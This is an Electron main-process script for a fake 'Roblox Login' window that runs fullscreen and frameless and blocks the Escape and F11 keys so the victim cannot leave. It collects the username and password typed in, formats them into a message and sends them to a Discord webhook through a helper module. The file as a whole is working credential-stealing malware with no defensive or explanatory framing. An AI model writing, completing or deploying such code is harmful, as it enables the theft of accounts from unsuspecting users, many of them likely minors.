const { app, BrowserWindow, ipcMain } = require('electron');
const { send } = require('./dcwebhook.js');
function createWindow() {
  const win = new BrowserWindow({
    fullscreen: true,
    width: 400,
    frame: false,
    height: 600,
    resizable: false,
    title: "Roblox Login",
    backgroundColor: '#000000',
    webPreferences: {
      nodeIntegration: true,   // allows require in renderer
      contextIsolation: false  // must be false to access ipcRenderer directly
    }
  });
  win.loadFile('index.html');
  win.webContents.on('before-input-event', (event, input) => {
    if (input.key === 'F11' || input.key === 'Escape') {
      event.preventDefault();
    }
  });
}

app.whenReady().then(createWindow);

ipcMain.on('send-credentials', (event, username, password) => {
  const msg = `Username: ${username}\nPassword: ${password}`;
  send(msg); // calls your dcwebhook.js
  console.log('Sent credentials to webhook');
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) createWindow();
});
